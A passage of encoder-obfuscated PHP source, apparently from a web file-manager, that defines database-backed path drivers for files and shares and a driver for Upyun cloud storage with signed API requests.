$­á®´ÍÓ[$_SERVER[¹ş¤¶ĞÖ][461]] : !1; } public function pathThis($²­¼šğ) { $•˜©©ö­ = $this->infoSimple($²­¼šğ); return $•˜©©ö­ ? $•˜©©ö­[$_SERVER[¹ş¤¶ĞÖ][32]] : !1; } public function getPathOuter($“åŞşÖ) { if (!$“åŞşÖ) { return $“åŞşÖ; } $¤×íÀ†Š = $this->parse($“åŞşÖ); return KodIO::make($¤×íÀ†Š[$_SERVER[¹ş¤¶ĞÖ][428]]); } public function copyFolderFromIO($£¬÷“½Ë, $…ùÜı‚ç, $À£Ê¾¾œ, $‘‰·Êê›, $ïĞ†×ü…) { $½»¿…¡à = $this->model->copyFolderFromIO($£¬÷“½Ë, $…ùÜı‚ç, $À£Ê¾¾œ, $‘‰·Êê›, $ïĞ†×ü…); return KodIO::make($½»¿…¡à); } public function isParentOf($‰»»Ú°´, $’Â™ªñô) { return $this->model->isParentOf($‰»»Ú°´, $’Â™ªñô); } public function mkfile($†Èà×Ä, $¤ÙÔó£• = '', $ÀíŞ‚¬‹ = REPEAT_RENAME) { $Ïğ…ƒô¾ =& $_SERVER[¹ş¤¶ĞÖ]; $íô¡æ· = $this->parse($†Èà×Ä); $†Èà×Ä = $íô¡æ·[$Ïğ…ƒô¾[428]]; for ($µÛ•¦÷ğ = 0; $µÛ•¦÷ğ < count($íô¡æ·[$Ïğ…ƒô¾[1367]]); $µÛ•¦÷ğ++) { $¦¦¢Ãß® = $íô¡æ·[$Ïğ…ƒô¾[1367]][$µÛ•¦÷ğ]; if ($µÛ•¦÷ğ == count($íô¡æ·[$Ïğ…ƒô¾[1367]]) - 1) { $†Èà×Ä = $this->model->mkfile($†Èà×Ä, $¦¦¢Ãß®, $¤ÙÔó£•, $ÀíŞ‚¬‹); break; } $†Èà×Ä = $this->model->mkdir($†Èà×Ä, $¦¦¢Ãß®, REPEAT_SKIP); } return $this->getPathOuter($†Èà×Ä); } public function mkdir($ÃÁñì‚, $åÒèî¼Ÿ = REPEAT_SKIP) { $¸¢Š¥€„ =& $_SERVER[¹ş¤¶ĞÖ]; $¤¬åšçŒ = $this->parse($ÃÁñì‚); $ÃÁñì‚ = $¤¬åšçŒ[$¸¢Š¥€„[428]]; for ($õˆåÓ‹… = 0; $õˆåÓ‹… < count($¤¬åšçŒ[$¸¢Š¥€„[1367]]); $õˆåÓ‹…++) { $Ç…–µÄ€ = $¤¬åšçŒ[$¸¢Š¥€„[1367]][$õˆåÓ‹…]; $ÃÁñì‚ = $this->model->mkdir($ÃÁñì‚, $Ç…–µÄ€, $åÒèî¼Ÿ); } return $this->getPathOuter($ÃÁñì‚); } public function copyFile($£ºéàÏ¨, $Ëéº††ş, $š’ŸËúÉ = REPEAT_REPLACE) { $Ôö®‘£• =& $_SERVER[¹ş¤¶ĞÖ]; $«ÆËšóÇ = $this->parse($Ëéº††ş); $ÄÓ˜İæç = $this->model->copy($£ºéàÏ¨, $«ÆËšóÇ[$Ôö®‘£•[428]], $š’ŸËúÉ, $«ÆËšóÇ[$Ôö®‘£•[84]]); return $ÄÓ˜İæç ? $this->getPathOuter($ÄÓ˜İæç) : !1; } public function moveFile($èŒ§˜œ, $ªÃËï÷, $ŞÈ‡¹ê = REPEAT_REPLACE) { $†ªç“„† =& $_SERVER[¹ş¤¶ĞÖ]; $êº­§¥ = $this->parse($ªÃËï÷); $í—Ï¿™¥ = $this->model->move($èŒ§˜œ, $êº­§¥[$†ªç“„†[428]], $ŞÈ‡¹ê, $êº­§¥[$†ªç“„†[84]]); return $í—Ï¿™¥ ? $this->getPathOuter($í—Ï¿™¥) : !1; } public function copy($–×Å¿İ, $¬âãä®Â, $šÍ©äİ· = REPEAT_REPLACE, $åï€º²– = false) { $®ïÙßÒ = $this->parse($¬âãä®Â); $‡´‹ êØ = $this->model->copy($–×Å¿İ, $®ïÙßÒ[$_SERVER[¹ş¤¶ĞÖ][428]], $šÍ©äİ·, $åï€º²–); return $‡´‹ êØ ? $this->getPathOuter($‡´‹ êØ) : !1; } public function moveSameAllow() { } public function move($øŸ¿‡è‹, $œİÎáÓ•, $ŒÖÇ¨Á× = REPEAT_REPLACE, $û²Õâ²ı = false) { $ÏÓ‘âÚ = $this->parse($œİÎáÓ•); $Ó”áèÓö = $this->model->move($øŸ¿‡è‹, $ÏÓ‘âÚ[$_SERVER[¹ş¤¶ĞÖ][428]], $ŒÖÇ¨Á×, $û²Õâ²ı); return $Ó”áèÓö ? $this->getPathOuter($Ó”áèÓö) : !1; } public function remove($˜ÉĞùïß, $Æ¢¿—µ¾ = true) { return $this->model->remove($˜ÉĞùïß, $Æ¢¿—µ¾); } public function rename($ïŒ€Õâ, $ÈúÙ»Ú«) { $›òİ£Ë¢ = $this->model->rename($ïŒ€Õâ, $ÈúÙ»Ú«); return $›òİ£Ë¢ ? $this->getPathOuter($ïŒ€Õâ) : $›òİ£Ë¢; } public function size($åÍüŒèİ) { $¬Š»Ï¬ø = $this->infoSimple($åÍüŒèİ); return $¬Š»Ï¬ø ? $¬Š»Ï¬ø[$_SERVER[¹ş¤¶ĞÖ][76]] : 0; } public function infoSimple($Û®°Ÿ³Œ) { return $this->model->sourceInfo($Û®°Ÿ³Œ); } public function info($ÌÄíÖ¥) { return $this->infoParse($ÌÄíÖ¥); } public function infoAuth($æ›Åû­Ô) { return $this->infoParse($æ›Åû­Ô, !1, !0); } public function infoWithChildren($ËÎõÏüó) { return $this->infoParse($ËÎõÏüó, !0); } protected function infoParse($„‹¨Ğ¦ğ, $«íºÚ˜ = false, $°»¼ÇüÁ = false) { if (!$«íºÚ˜) { return $this->model->pathInfo($„‹¨Ğ¦ğ, $°»¼ÇüÁ); } return $this->model->pathInfoMore($„‹¨Ğ¦ğ); } public function infoFull($¬¬¸Ğ¢) { $ªˆ¹ò¸Ñ =& $_SERVER[¹ş¤¶ĞÖ]; $ÆˆÇ‹·Î = explode($ªˆ¹ò¸Ñ[8], $¬¬¸Ğ¢); $ı£ú’Û² = implode($ªˆ¹ò¸Ñ[8], array_splice($ÆˆÇ‹·Î, 1)); return $this->model->pathInfoByPath($ÆˆÇ‹·Î[0], $ı£ú’Û²); } public function hashSimple($îµŞš©) { $Ïâ«‘µı =& $_SERVER[¹ş¤¶ĞÖ]; $¶¦½Í—¶ = $this->infoWithChildren($îµŞš©); return $¶¦½Í—¶[$Ïâ«‘µı[170]][$Ïâ«‘µı[177]]; } public function hashMd5($‘Óı”‚á) { $ÑÏàœ³µ =& $_SERVER[¹ş¤¶ĞÖ]; $œ‰¶ª„¦ = $this->infoWithChildren($‘Óı”‚á); return $œ‰¶ª„¦[$ÑÏàœ³µ[170]][$ÑÏàœ³µ[176]]; } public function exist($öÂÑÏˆö) { $ê Í©º =& $_SERVER[¹ş¤¶ĞÖ]; $²„€Ğ´• = $this->parse($öÂÑÏˆö); if (!$²„€Ğ´•[$ê Í©º[84]]) { return $this->isFile($öÂÑÏˆö) || $this->isFolder($öÂÑÏˆö); } $“×äÅ‰ = array($ê Í©º[430] => $²„€Ğ´•[$ê Í©º[428]], $ê Í©º[32] => $²„€Ğ´•[$ê Í©º[84]]); $ı¦“Èü = $this->model->where($“×äÅ‰)->find(); return $ı¦“Èü ? !0 : !1; } public function isFile($øÌ¾Ä•¿) { $…á˜ï¾‘ =& $_SERVER[¹ş¤¶ĞÖ]; $ºÁí“£ = $this->infoSimple($øÌ¾Ä•¿); return $ºÁí“£ && $ºÁí“£[$…á˜ï¾‘[439]] == $…á˜ï¾‘[88] ? !1 : !0; } public function isFolder($êÇ¢¦è¨) { $Şş…½ùÔ =& $_SERVER[¹ş¤¶ĞÖ]; $“šù£¯ş = $this->infoSimple($êÇ¢¦è¨); return $“šù£¯ş && $“šù£¯ş[$Şş…½ùÔ[439]] == $Şş…½ùÔ[88] ? !0 : !1; } public function listPath($Å­æÚ‹«, $ï¬öû®è = false) { $‰íÌ”Òú =& $_SERVER[¹ş¤¶ĞÖ]; if ($Å­æÚ‹« == $‰íÌ”Òú[12]) { return !1; } $‚¢Ô†²” = array($‰íÌ”Òú[430] => $Å­æÚ‹«); if ($ï¬öû®è) { return $this->model->listSource($‚¢Ô†²”, -1); } return $this->model->listSource($‚¢Ô†²”); } public function has($Ñ‰õš‹ù, $ë¶’÷ø° = false, $„ë­äœß = null) { $ŒéÄ”Ê÷ =& $_SERVER[¹ş¤¶ĞÖ]; $…¸ÇÎÄ = $this->infoWithChildren($Ñ‰õš‹ù); if ($ë¶’÷ø°) { return array($ŒéÄ”Ê÷[208] => $…¸ÇÎÄ[$ŒéÄ”Ê÷[208]], $ŒéÄ”Ê÷[207] => $…¸ÇÎÄ[$ŒéÄ”Ê÷[207]]); } return $„ë­äœß ? $…¸ÇÎÄ[$ŒéÄ”Ê÷[208]] : $…¸ÇÎÄ[$ŒéÄ”Ê÷[207]]; } public function listAll($¿¸…´») { $û‚¹Ş™ = IO::info($this->pathParse[$_SERVER[¹ş¤¶ĞÖ][84]]); if (!$û‚¹Ş™) { return array(); } return $this->model->listAll($¿¸…´»); } public function getContent($¿·Æ„‡ˆ) { return $this->model->getContent($¿·Æ„‡ˆ); } public function setContent($Ô¿â¬¼, $üÄô’²ñ = '') { return $this->model->setContent($Ô¿â¬¼, $üÄô’²ñ); } public function fileSubstr($èç«‘±œ, $²ÀÉ¿…œ, $ºèÒ‡¡) { return $this->model->fileSubstr($èç«‘±œ, $²ÀÉ¿…œ, $ºèÒ‡¡); } public function download($æ«›ûîß, $¢¼¥ÊºÓ = '') { $Ø¬«È« = get_path_father($¢¼¥ÊºÓ); $­»«ä§ = get_path_this($¢¼¥ÊºÓ); $Òöß©â = $this->model->fileInfoGet($æ«›ûîß); $œØˆ•Œ´ = IO::copy($Òöß©â[$_SERVER[¹ş¤¶ĞÖ][84]], $Ø¬«È«, !1, $­»«ä§); return $œØˆ•Œ´; } public function setModifyTime($ŒÉÎÏÙË, $Ò„ø‚ÅË = '') { $ƒÌ£¬Ë =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ŒÉÎÏÙË) { return; } $this->model->where(array($ƒÌ£¬Ë[446] => $ŒÉÎÏÙË))->save(array($ƒÌ£¬Ë[85] => $Ò„ø‚ÅË)); } public function upload($‰“˜ñ¬“, $ÊÛ½›ÖØ, $©û¨ô¥Ó = false, $óÁç§¯Æ = REPEAT_REPLACE) { $ÎÊ€™ûí =& $_SERVER[¹ş¤¶ĞÖ]; $¿Ş¯ñ¤ğ = $this->parse($‰“˜ñ¬“); $Ú¨ ”ó = $this->model->addFile($¿Ş¯ñ¤ğ[$ÎÊ€™ûí[428]], $ÊÛ½›ÖØ, $¿Ş¯ñ¤ğ[$ÎÊ€™ûí[84]], $©û¨ô¥Ó, $óÁç§¯Æ); return $this->getPathOuter($Ú¨ ”ó); } public function uploadFileByID($¶úŒ‰Ô, $õ‹äÄˆ¶, $‡ş½İ‹Ç) { $éÌÎåı• =& $_SERVER[¹ş¤¶ĞÖ]; $‚¤¡Áë¼ = $this->parse($¶úŒ‰Ô); $œ°ñ” = $this->model->addFileByFileID($‚¤¡Áë¼[$éÌÎåı•[428]], $õ‹äÄˆ¶, $‚¤¡Áë¼[$éÌÎåı•[84]], $‡ş½İ‹Ç); return $this->getPathOuter($œ°ñ”); } public function addFileByRemote($ş…çÅÒö, $ĞÉ¸Úã², $Ó¾•¿ä = array(), $Òİûå¶ô = '', $ş‹Éœ‚¶) { $§†´œîş =& $_SERVER[¹ş¤¶ĞÖ]; $ÉÛäİ = $this->parse($ş…çÅÒö); $Òİûå¶ô = empty($Òİûå¶ô) ? $ÉÛäİ[$§†´œîş[84]] : $Òİûå¶ô; $¢ºã¡İù = $this->model->addFileByRemote($ÉÛäİ[$§†´œîş[428]], $ĞÉ¸Úã², $Òİûå¶ô, $Ó¾•¿ä, $ş‹Éœ‚¶); return $this->getPathOuter($¢ºã¡İù); } public function uploadLink($á¢ªèø÷, $Äí¾úçˆ = 0) { $‹çÙŒ× =& $_SERVER[¹ş¤¶ĞÖ]; $ï¾»ÕÑÍ = $this->parse($á¢ªèø÷); $Û¸¸Çû = _get($GLOBALS[$‹çÙŒ×[7]], $‹çÙŒ×[1368]); $ ÄÅñêï = _get($GLOBALS[$‹çÙŒ×[7]], $‹çÙŒ×[1369]); $á¢ªèø÷ = Model($‹çÙŒ×[630])->createFileName($ï¾»ÕÑÍ[$‹çÙŒ×[84]], $Û¸¸Çû, $ ÄÅñêï); return IO::uploadLink($á¢ªèø÷, $Äí¾úçˆ); } public function fileNameAuto($Îõ¿¾, $³›İì¬è, $Ô®ÆÈ¯ = REPEAT_REPLACE, $§ÀØºÆ = false) { return $this->model->fileNameAuto($Îõ¿¾, $³›İì¬è, $Ô®ÆÈ¯, $§ÀØºÆ); } public function fileNameExist($ĞšÓ­¶, $õŒ…¬ ş) { return $this->model->fileNameExist($ĞšÓ­¶, $õŒ…¬ ş); } protected function _fileOut($±§©ïŸ, $ãÄÆÑÓâ = false, $êŸ­èÔÔ = false, $À€Ñ›Ìİ = '', $‹ÅñîªŸ = false) { $¬ì™§š± =& $_SERVER[¹ş¤¶ĞÖ]; $´«°ä  = $this->model->sourceInfo($±§©ïŸ); if ($´«°ä [$¬ì™§š±[439]] == $¬ì™§š±[88]) { header($¬ì™§š±[1370]); die; } $Úî² ‹ = $this->model->fileInfoGet($±§©ïŸ); $À€Ñ›Ìİ = $Úî² ‹[$¬ì™§š±[176]] ? $Úî² ‹[$¬ì™§š±[176]] : $À€Ñ›Ìİ; $§ÑÚĞÛô = isset($GLOBALS[$¬ì™§š±[1371]]) ? $GLOBALS[$¬ì™§š±[1371]] : $´«°ä [$¬ì™§š±[32]]; if ($‹ÅñîªŸ) { return IO::fileOutServer($Úî² ‹[$¬ì™§š±[84]], $ãÄÆÑÓâ, $§ÑÚĞÛô, $À€Ñ›Ìİ); } IO::fileOut($Úî² ‹[$¬ì™§š±[84]], $ãÄÆÑÓâ, $§ÑÚĞÛô, $À€Ñ›Ìİ); } public function fileOut($­ëã¢µá, $İ×²©—Ò = false, $•÷†š– = false, $ú©öÒ³å = '') { $this->_fileOut($­ëã¢µá, $İ×²©—Ò, $•÷†š–, $ú©öÒ³å); } public function fileOutServer($ÎÚ‰ãÃ¢, $—œÌó“¥ = false, $Ä˜ŸÜÂĞ = false, $”ßÁ£² = '') { $this->_fileOut($ÎÚ‰ãÃ¢, $—œÌó“¥, $Ä˜ŸÜÂĞ, $”ßÁ£², !0); } protected function _fileOutImage($óäœæ¸°, $ Œşµæƒ = 250) { $²øª · =& $_SERVER[¹ş¤¶ĞÖ]; $šœÍ¯Şâ = $this->model->pathInfo($óäœæ¸°); if ($šœÍ¯Şâ[$²øª ·[439]] == $²øª ·[88]) { show_json($²øª ·[1372] . $óäœæ¸°, !1); } $úØë˜À = $this->model->fileInfoGet($óäœæ¸°); $úØë˜À[$²øª ·[32]] = $šœÍ¯Şâ[$²øª ·[32]]; $úØë˜À[$²øª ·[169]] = $šœÍ¯Şâ[$²øª ·[169]]; $GLOBALS[$²øª ·[1371]] = $úØë˜À[$²øª ·[32]]; $GLOBALS[$²øª ·[168]] = $úØë˜À; IO::fileOutImage($úØë˜À[$²øª ·[84]], $ Œşµæƒ); } public function fileOutImage($¥Ø‰ü°, $Å¿’õ¯‘ = 250) { $this->_fileOutImage($¥Ø‰ü°, $Å¿’õ¯‘); } public function fileOutImageServer($†ó©±§³, $ëæ­ºø° = 250) { $this->_fileOutImage($†ó©±§³, $ëæ­ºø°); } public function link($ú³ĞáÜî, $ Ç™š¿é = '') { $ÜÖ‡Ó¯” = $this->model->fileInfoGet($ú³ĞáÜî); return IO::link($ÜÖ‡Ó¯”[$_SERVER[¹ş¤¶ĞÖ][84]], $ Ç™š¿é); } protected function parse($¸æ´Ì¿€) { $¨íòš˜ =& $_SERVER[¹ş¤¶ĞÖ]; if (strstr($¸æ´Ì¿€, $¨íòš˜[8]) === !1) { return array($¨íòš˜[448] => intval($¸æ´Ì¿€), $¨íòš˜[84] => $¨íòš˜[12], $¨íòš˜[1367] => array()); } $óÓ·ÚĞ  = explode($¨íòš˜[8], trim($¸æ´Ì¿€, $¨íòš˜[8])); if (count($óÓ·ÚĞ ) < 2) { show_tips(clear_html($¸æ´Ì¿€) . $¨íòš˜[1373]); } return array($¨íòš˜[448] => intval($óÓ·ÚĞ [0]), $¨íòš˜[84] => $óÓ·ÚĞ [1], $¨íòš˜[1367] => array_slice($óÓ·ÚĞ , 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ßÂÖÜ˜×) { $this->pathParse = $ßÂÖÜ˜×; $this->model = Model($_SERVER[¹ş¤¶ĞÖ][1366]); } public function getPathOuter($ØìÓ–úÇ) { $Ãé½‡è =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ØìÓ–úÇ) { return $ØìÓ–úÇ; } $¬áÒ±š— = $this->parse($ØìÓ–úÇ); return trim(KodIO::makeShare($this->pathParse[$Ãé½‡è[428]], $¬áÒ±š—[$Ãé½‡è[428]]), $Ãé½‡è[8]); } protected function infoParse($ùÜóñ›, $ÌºÃ®­ = false, $Âá½Úú— = false) { $­ÙÇ¼Æ =& $_SERVER[¹ş¤¶ĞÖ]; $ğ²á¤ëö = $this->pathParse[$­ÙÇ¼Æ[428]]; $áêïš± = trim($this->pathParse[$­ÙÇ¼Æ[1201]], $­ÙÇ¼Æ[8]); return Action($­ÙÇ¼Æ[1374])->sharePathInfo($ğ²á¤ëö, $áêïš±, $ÌºÃ®­); } public function infoFull($¬¯ááÂ¸) { $Šôóì·ê =& $_SERVER[¹ş¤¶ĞÖ]; $¯é´š = explode($Šôóì·ê[8], trim($¬¯ááÂ¸, $Šôóì·ê[8])); if (count($¯é´š) > 1) { $İ¥»¤ = implode($Šôóì·ê[8], array_splice($¯é´š, 1)); $ç­×÷­Ş = $this->model->pathInfoByPath($¯é´š[0], $İ¥»¤); if (!$ç­×÷­Ş) { return !1; } $this->pathParse[$Šôóì·ê[1201]] = $ç­×÷­Ş[$Šôóì·ê[431]]; } return $this->infoParse($¬¯ááÂ¸); } public function listAll($ÚÙŞ¤Ã¡) { $Ú¤ø¶¢¿ =& $_SERVER[¹ş¤¶ĞÖ]; $†’Ù³ÅÔ = IO::info($this->pathParse[$Ú¤ø¶¢¿[84]]); if (!$†’Ù³ÅÔ) { return array(); } $´ÊéÆô = $this->model->listAll($ÚÙŞ¤Ã¡); $ŠìˆÃìù = Model($Ú¤ø¶¢¿[621])->getInfo($†’Ù³ÅÔ[$Ú¤ø¶¢¿[622]]); foreach ($´ÊéÆô as &$¾•ëÀ˜Ñ) { check_abort(); $¾•ëÀ˜Ñ[$Ú¤ø¶¢¿[87]] = Action($Ú¤ø¶¢¿[1374])->_shareItemeParse($¾•ëÀ˜Ñ[$Ú¤ø¶¢¿[87]], $ŠìˆÃìù); } unset($¾•ëÀ˜Ñ); return $´ÊéÆô; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($‚Ş‰µøÁ) { $this->pathParse = $‚Ş‰µøÁ; $this->model = Model($_SERVER[¹ş¤¶ĞÖ][1366]); } protected function infoParse($üØäÉ½, $–Ê·Åƒç = false, $Ãé›Îæ  = false) { $üˆ°Öš =& $_SERVER[¹ş¤¶ĞÖ]; return Action($üˆ°Öš[1207])->sharePathInfo($this->pathParse[$üˆ°Öš[84]], !0, $–Ê·Åƒç); } public function listPath($ Ò¾§ì°, $Ü¾ÆÉ‹ş = false) { $İüğ£ì¸ =& $_SERVER[¹ş¤¶ĞÖ]; $Î×¯æƒ = parent::listPath($ Ò¾§ì°, $Ü¾ÆÉ‹ş); if (!$Î×¯æƒ) { return $Î×¯æƒ; } if (is_array($Î×¯æƒ[$İüğ£ì¸[1375]])) { $Î×¯æƒ[$İüğ£ì¸[1375]] = Action($İüğ£ì¸[1207])->shareItemInfo($Î×¯æƒ[$İüğ£ì¸[1375]]); } foreach ($Î×¯æƒ as $‹ŞĞªô => $Ú¯¼åÔà) { if (!in_array($‹ŞĞªô, array($İüğ£ì¸[83], $İüğ£ì¸[82]))) { continue; } foreach ($Ú¯¼åÔà as $È÷Ÿº‹æ => $âÒá“) { $Î×¯æƒ[$‹ŞĞªô][$È÷Ÿº‹æ] = Action($İüğ£ì¸[1207])->shareItemInfo($âÒá“); } } return $Î×¯æƒ; } public function listAll($ä²ÅÆ›) { $¨ˆ’é«¼ =& $_SERVER[¹ş¤¶ĞÖ]; $™ç¿è±ù = IO::info($this->pathParse[$¨ˆ’é«¼[84]]); if (!$™ç¿è±ù) { return array(); } $–ˆÈšºı = $this->model->listAll($ä²ÅÆ›); foreach ($–ˆÈšºı as &$ä¬¸ÔÊ‰) { $ä¬¸ÔÊ‰[$¨ˆ’é«¼[87]] = Action($¨ˆ’é«¼[1207])->shareItemInfo($ä¬¸ÔÊ‰[$¨ˆ’é«¼[87]]); } unset($ä¬¸ÔÊ‰); return $–ˆÈšºı; } } goto D²Ã–íŞøñ; CøÛÁ“—Øì: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\x3a\x2f\57\166\x30\x2e\141\x70\x69\56\165\160\x79\165\156\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($²Œû¦ï) { parent::__construct(); $this->_init($²Œû¦ï); } public function _init($¨ôä†˜ô) { $áÊÂÊš¢ =& $_SERVER[¹ş¤¶ĞÖ]; foreach ($¨ôä†˜ô as $Ñıüû¼á => $ÜëªÒı) { if (isset($this->{$Ñıüû¼á})) { $this->{$Ñıüû¼á} = $ÜëªÒı; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($áÊÂÊš¢[1472] . LNG($áÊÂÊš¢[1403])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÍµİÎŠ, $ƒ°õç”Ğ = "\x47\x45\124") { $¹·¢Ö£İ =& $_SERVER[¹ş¤¶ĞÖ]; $—£“à = gmdate($¹·¢Ö£İ[1436]); $ÈÀœù» = base64_encode(hash_hmac($¹·¢Ö£İ[1473], "{$ƒ°õç”Ğ}\46{$ÍµİÎŠ}\x26{$—£“à}", md5("{$this->userpass}"), !0)); $ú›Ü«ä÷ = array("\101\x75\164\150\x6f\x72\151\172\x61\164\151\x6f\156\x3a\125\120\131\125\116\x20{$this->username}\x3a{$ÈÀœù»}", "\104\141\164\x65\x3a{$—£“à}"); return $ú›Ü«ä÷; } public function ussRequest($õÙüš´§, $ö’…œİå = "\107\x45\124", $Ä›ãœ³ = false, $Ô’öò‘¾ = false, $µ¦øÜÊÈ = false) { $„—ÙÓı =& $_SERVER[¹ş¤¶ĞÖ]; $õÙüš´§ = trim($õÙüš´§, $„—ÙÓı[8]); $‹Êò¥ó¯ = "\x2f{$this->bucket}\x2f{$õÙüš´§}"; $Ÿ±ÈİÆˆ = $this->ussHeaders($‹Êò¥ó¯, $ö’…œİå); if ($Ô’öò‘¾) { $Ÿ±ÈİÆˆ = array_merge($Ÿ±ÈİÆˆ, $Ô’öò‘¾); } $Í¸Ç€’Î = url_request($this->endpoint . $‹Êò¥ó¯, $ö’…œİå, $Ä›ãœ³, $Ÿ±ÈİÆˆ, $µ¦øÜÊÈ); if (!$Í¸Ç€’Î) { return array($„—ÙÓı[1245] => !1, $„—ÙÓı[1235] => $„—ÙÓı[1474]); } if (strtolower($ö’…œİå) == $„—ÙÓı[197] || in_array($Í¸Ç€’Î[$„—ÙÓı[1245]], array($„—ÙÓı[242], $„—ÙÓı[1475]))) { $Ä›ãœ³ = $Í¸Ç€’Î[$„—ÙÓı[1476]]; } else { $Ä›ãœ³ = json_decode($Í¸Ç€’Î[$„—ÙÓı[1235]], !0); if (!$Ä›ãœ³) { $Ä›ãœ³ = $Í¸Ç€’Î[$„—ÙÓı[1235]]; } else { if (!$Í¸Ç€’Î[$„—ÙÓı[776]] && isset($Ä›ãœ³[$„—ÙÓı[1477]])) { $Ä›ãœ³ = $Ä›ãœ³[$„—ÙÓı[1477]]; } } } return array($„—ÙÓı[1245] => $Í¸Ç€’Î[$„—ÙÓı[776]], $„—ÙÓı[1235] => $Ä›ãœ³); } public function mkfile($öÅ…—¦, $Ù„öß¡» = '', $ÁÃ” ÄÓ = REPEAT_RENAME) { if ($this->setContent($öÅ…—¦, $Ù„öß¡»)) { return $this->getPathOuter($öÅ…—¦); } return !1; } public function mkdir($ãüóûèñ, $îÁ°íİğ = REPEAT_SKIP) { $¯¼ê¤±ø =& $_SERVER[¹ş¤¶ĞÖ]; $¶¶ş§é = trim($ãüóûèñ, $¯¼ê¤±ø[8]); if ($this->_isFolder($¶¶ş§é)) { return $this->getPathOuter($¶¶ş§é); } $ùĞØ = array($¯¼ê¤±ø[1478]); $¤ªÀİö¹ = $this->ussRequest($¶¶ş§é, $¯¼ê¤±ø[226], !1, $ùĞØ); return $¤ªÀİö¹[$¯¼ê¤±ø[1245]] ? $this->getPathOuter($¶¶ş§é) : !1; } public function copyFile($ØààÌ, $ÕõõÛÀ®) { $Ğ§éËÖ =& $_SERVER[¹ş¤¶ĞÖ]; $ç·Û•ş¥ = array($Ğ§éËÖ[1479] . "\x2f{$this->bucket}\x2f{$ØààÌ}", $Ğ§éËÖ[1480]); $£á‹²ş° = $this->ussRequest($ÕõõÛÀ®, $Ğ§éËÖ[228], !1, $ç·Û•ş¥); return $£á‹²ş°[$Ğ§éËÖ[1245]] ? !0 : $this->getPathOuter($ÕõõÛÀ®); } public function moveFile($˜‡¯ü¿³, $¢“ºìêÉ) { $šë…‡§¥ =& $_SERVER[¹ş¤¶ĞÖ]; $Ó¥ÚéµÑ = array($šë…‡§¥[1481] . "\x2f{$this->bucket}\57{$˜‡¯ü¿³}", $šë…‡§¥[1480]); $É¡“ÆÇ = $this->ussRequest($¢“ºìêÉ, $šë…‡§¥[228], !1, $Ó¥ÚéµÑ); return $É¡“ÆÇ[$šë…‡§¥[1245]] ? !0 : $this->getPathOuter($¢“ºìêÉ); } public function delFile($Õªô¸£¬) { $ÊãßÜ¯Ã =& $_SERVER[¹ş¤¶ĞÖ]; $à‘îÅ„« = $this->ussRequest($Õªô¸£¬, $ÊãßÜ¯Ã[1482]); return $à‘îÅ„«[$ÊãßÜ¯Ã[1245]] ? !0 : !1; } public function delFolder($ÚÜÂ œ€) { $³¢Å´—Ù =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->exist($ÚÜÂ œ€)) { return !0; } $this->listItemCache = !1; $¥Ç„Øü™ = $¯ˆïÍÖ­ = array(); $this->fileList($ÚÜÂ œ€, $¥Ç„Øü™, $¯ˆïÍÖ­, !0); $this->listItemCache = !0; foreach ($¯ˆïÍÖ­ as $£ÈØ¾Ä) { $½üõô = $this->ussRequest($£ÈØ¾Ä[$³¢Å´—Ù[32]], $³¢Å´—Ù[1482]); if (!$½üõô[$³¢Å´—Ù[1245]]) { return !1; } } foreach ($¥Ç„Øü™ as $Ãè“…Í) { $½üõô = $this->ussRequest($Ãè“…Í, $³¢Å´—Ù[1482]); if (!$½üõô[$³¢Å´—Ù[1245]]) { return !1; } } $½üõô = $this->ussRequest($ÚÜÂ œ€, $³¢Å´—Ù[1482]); return $½üõô[$³¢Å´—Ù[1245]]; } public function rename($ç×œó , $®ï“şæ) { if ($this->isFile($ç×œó )) { $®ï“şæ = get_path_father($ç×œó ) . $®ï“şæ; return $this->moveFile($ç×œó , $®ï“şæ); } return $this->renameObject($ç×œó , $®ï“şæ); } public function fileInfo($µÔ‚£ú‰, $£óˆîÚÁ = false, $ÇÎåšÄ = array()) { $éã¡¡ËÁ =& $_SERVER[¹ş¤¶ĞÖ]; $¤´Ã’ùµ = array($éã¡¡ËÁ[32] => $this->pathThis($µÔ‚£ú‰), $éã¡¡ËÁ[84] => $this->getPathOuter($éã¡¡ËÁ[8] . $µÔ‚£ú‰), $éã¡¡ËÁ[33] => $éã¡¡ËÁ[200], $éã¡¡ËÁ[76] => isset($ÇÎåšÄ[$éã¡¡ËÁ[76]]) ? $ÇÎåšÄ[$éã¡¡ËÁ[76]] : 0, $éã¡¡ËÁ[174] => $this->ext($µÔ‚£ú‰)); if ($£óˆîÚÁ) { return $¤´Ã’ùµ; } $¤´Ã’ùµ[$éã¡¡ËÁ[201]] = $¤´Ã’ùµ[$éã¡¡ËÁ[85]] = 0; $¤´Ã’ùµ[$éã¡¡ËÁ[202]] = $¤´Ã’ùµ[$éã¡¡ËÁ[203]] = !0; if (empty($ÇÎåšÄ)) { $ÇÎåšÄ = $this->objectMeta($µÔ‚£ú‰); if (!$ÇÎåšÄ) { return $¤´Ã’ùµ; } } $¤´Ã’ùµ[$éã¡¡ËÁ[201]] = intval($ÇÎåšÄ[$éã¡¡ËÁ[1483]]); $¤´Ã’ùµ[$éã¡¡ËÁ[85]] = intval($ÇÎåšÄ[$éã¡¡ËÁ[1484]]); $¤´Ã’ùµ[$éã¡¡ËÁ[76]] = $ÇÎåšÄ[$éã¡¡ËÁ[76]]; return $¤´Ã’ùµ; } public function folderInfo($¹äÕ›¦Ã, $¡Ë«»šœ = false) { $üß’²”ã =& $_SERVER[¹ş¤¶ĞÖ]; $®ùÈ›Ùæ = array($üß’²”ã[32] => $this->pathThis($¹äÕ›¦Ã), $üß’²”ã[84] => $this->getPathOuter($üß’²”ã[8] . $¹äÕ›¦Ã), $üß’²”ã[33] => $üß’²”ã[75]); if ($¡Ë«»šœ) { return $®ùÈ›Ùæ; } $®ùÈ›Ùæ[$üß’²”ã[201]] = $®ùÈ›Ùæ[$üß’²”ã[85]] = 0; $®ùÈ›Ùæ[$üß’²”ã[202]] = $®ùÈ›Ùæ[$üß’²”ã[203]] = 